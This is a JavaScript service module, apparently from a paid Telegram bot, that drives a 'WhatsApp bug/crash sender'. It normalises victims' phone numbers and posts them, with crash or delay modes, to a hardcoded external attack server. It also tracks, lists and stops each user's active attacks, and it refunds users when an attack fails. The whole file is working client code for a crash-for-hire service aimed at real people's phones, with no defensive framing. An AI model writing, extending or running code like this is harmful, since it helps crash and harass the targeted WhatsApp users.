const axios = require('axios');
const config = require('../config');
const { sanitizeErrorMessage } = require('../utils/helper');

/**
 * BugWA Service - WhatsApp Bug/Crash Sender (Telegram Bot Version)
 * API: http://159.223.64.52:5004
 */
class BugWAService {
    constructor() {
        this.baseUrl = config.bugwaBaseUrl;
        this.sessionUser = config.bugwaSessionUser;
        this.sessionId = config.bugwaSessionId;
        this.defaultTimeout = 30000;
        
        // Track active attacks per user (telegramUserId -> Set of attack keys)
        this.userAttacks = new Map();
        
        // Valid modes
        this.validModes = {
            'crashinvis': { value: 'CrashInvis', name: 'Crash Invisible', icon: '⚡' },
            'invisdelay': { value: 'invisDelay', name: 'Delay Invisible', icon: '⏳' }
        };
    }

    /**
     * Get valid modes list
     */
    getValidModes() {
        return this.validModes;
    }

    /**
     * Get cookie string
     */
    getCookie() {
        if (!this.sessionUser || !this.sessionId) return '';
        return `sessionUser=${this.sessionUser}; sessionId=${this.sessionId}`;
    }

    /**
     * Normalize phone number to format without +
     * @param {string} target - Target phone number
     * @returns {string} - Normalized number (e.g. 6283800104178)
     */
    normalizeNumber(target) {
        let num = target.replace(/[^0-9]/g, '');
        if (num.startsWith('0')) {
            num = '62' + num.slice(1);
        }
        return num;
    }

    /**
     * Send bug/crash to target
     * @param {string} target - Target phone number
     * @param {string} mode - Attack mode (crashinvis/invisdelay)
     * @param {string} userId - User ID for tracking
     * @returns {Promise<Object>}
     */
    async attack(target, mode, userId) {
        try {
            const modeInfo = this.validModes[mode.toLowerCase()];
            if (!modeInfo) {
                return {
                    success: false,
                    error: `Mode tidak valid. Pilih: ${Object.keys(this.validModes).join(', ')}`,
                    refund: true
                };
            }

            const normalizedTarget = this.normalizeNumber(target);
            
            if (normalizedTarget.length < 10 || normalizedTarget.length > 15) {
                return {
                    success: false,
                    error: 'Nomor target tidak valid (10-15 digit)',
                    refund: true
                };
            }

            const response = await axios.post(`${this.baseUrl}/execution`, 
                `target=${normalizedTarget}&mode=${modeInfo.value}`,
                {
                    timeout: this.defaultTimeout,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                        'Accept': '*/*',
                        'Cookie': this.getCookie(),
                        'Origin': this.baseUrl,
                        'Referer': `${this.baseUrl}/execution`
                    }
                }
            );

            const data = response.data;

            if (data.success) {
                // Track this attack for the user
                const attackKey = `${normalizedTarget}@s.whatsapp.net-${modeInfo.value}`;
                if (!this.userAttacks.has(userId)) {
                    this.userAttacks.set(userId, new Set());
                }
                this.userAttacks.get(userId).add(attackKey);

                return {
                    success: true,
                    data: {
                        target: normalizedTarget,
                        formattedTarget: data.details?.formattedTarget || `+${normalizedTarget}`,
                        mode: modeInfo.value,
                        modeName: modeInfo.name,
                        modeIcon: modeInfo.icon,
                        senders: data.details?.senders || [],
                        senderCount: data.details?.senderCount || 0,
                        country: data.details?.country || '-'
                    },
                    message: data.message || 'Bug dikirim!',
                    refund: false
                };
            }

            return {
                success: false,
                error: data.message || 'Gagal mengirim bug',
                refund: true
            };

        } catch (error) {
            console.error('❌ [BugWA] Attack Error:', error.message);
            return {
                success: false,
                error: sanitizeErrorMessage(error),
                refund: true
            };
        }
    }

    /**
     * Stop attack on target
     * @param {string} target - Target phone number
     * @param {string} mode - Attack mode
     * @param {string} userId - User ID for tracking
     * @returns {Promise<Object>}
     */
    async stopAttack(target, mode, userId) {
        try {
            const modeInfo = this.validModes[mode.toLowerCase()];
            if (!modeInfo) {
                return {
                    success: false,
                    error: `Mode tidak valid. Pilih: ${Object.keys(this.validModes).join(', ')}`
                };
            }

            const normalizedTarget = this.normalizeNumber(target);

            const response = await axios.post(`${this.baseUrl}/api/stop-attack`,
                {
                    sender: 'undefined',
                    target: `${normalizedTarget}@s.whatsapp.net`,
                    mode: modeInfo.value
                },
                {
                    timeout: this.defaultTimeout,
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                        'Accept': '*/*',
                        'Cookie': this.getCookie(),
                        'Origin': this.baseUrl,
                        'Referer': `${this.baseUrl}/active-attacks`
                    }
                }
            );

            const data = response.data;

            // Remove from user tracking
            const attackKey = `${normalizedTarget}@s.whatsapp.net-${modeInfo.value}`;
            if (this.userAttacks.has(userId)) {
                this.userAttacks.get(userId).delete(attackKey);
            }

            return {
                success: true,
                message: data.message || 'Attack dihentikan',
                target: normalizedTarget,
                mode: modeInfo.name
            };

        } catch (error) {
            console.error('❌ [BugWA] Stop Error:', error.message);
            return {
                success: false,
                error: sanitizeErrorMessage(error)
            };
        }
    }

    /**
     * Get active attacks (filtered by user)
     * @param {string} userId - User ID to filter
     * @returns {Promise<Object>}
     */
    async getActiveAttacks(userId) {
        try {
            const response = await axios.get(`${this.baseUrl}/api/active-attacks`, {
                timeout: this.defaultTimeout,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                    'Accept': '*/*',
                    'Cookie': this.getCookie(),
                    'Referer': `${this.baseUrl}/active-attacks`
                }
            });

            const data = response.data;

            if (!data.success || !data.attacks) {
                return {
                    success: true,
                    attacks: [],
                    total: 0
                };
            }

            // Filter attacks by user's tracked attacks
            const userTracked = this.userAttacks.get(userId) || new Set();
            const allAttacks = Object.entries(data.attacks);
            
            const userAttacks = allAttacks
                .filter(([key]) => userTracked.has(key))
                .map(([key, attack]) => ({
                    key,
                    target: attack.target?.replace('@s.whatsapp.net', '') || '-',
                    mode: attack.mode || '-',
                    count: attack.count || 0,
                    senderCount: attack.totalSenders || 0,
                    senders: attack.senders || []
                }));

            return {
                success: true,
                attacks: userAttacks,
                total: userAttacks.length
            };

        } catch (error) {
            console.error('❌ [BugWA] Active Attacks Error:', error.message);
            return {
                success: false,
                error: sanitizeErrorMessage(error),
                attacks: [],
                total: 0
            };
        }
    }
}

module.exports = new BugWAService();
